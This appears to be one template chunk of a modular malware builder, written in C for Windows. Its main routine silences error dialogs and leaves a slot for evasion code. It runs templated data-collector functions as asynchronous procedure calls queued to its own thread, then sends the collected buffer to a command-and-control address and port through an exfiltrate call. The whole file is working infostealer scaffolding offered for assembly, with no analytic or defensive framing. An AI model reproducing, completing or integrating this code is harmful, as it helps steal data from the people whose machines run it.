// chunk: arch/apc_self
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// note: Executes collectors as APC callbacks queued to own thread

#ifndef CHUNK_ARCH_APC
#define CHUNK_ARCH_APC

typedef void (*collector_fn)(void);

static collector_fn g_apc_collectors[32];
static int g_apc_count = 0;
static volatile LONG g_apc_done = 0;

static VOID CALLBACK apc_runner(ULONG_PTR param) {
    int idx = (int)param;
    if (idx < g_apc_count)
        g_apc_collectors[idx]();
    InterlockedIncrement(&g_apc_done);
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_apc_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_apc_count && i < 32; i++)
        g_apc_collectors[i] = collectors[i];

    HANDLE self = GetCurrentThread();
    for (int i = 0; i < g_apc_count; i++)
        QueueUserAPC(apc_runner, self, (ULONG_PTR)i);

    while (g_apc_done < g_apc_count)
        SleepEx(100, TRUE);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
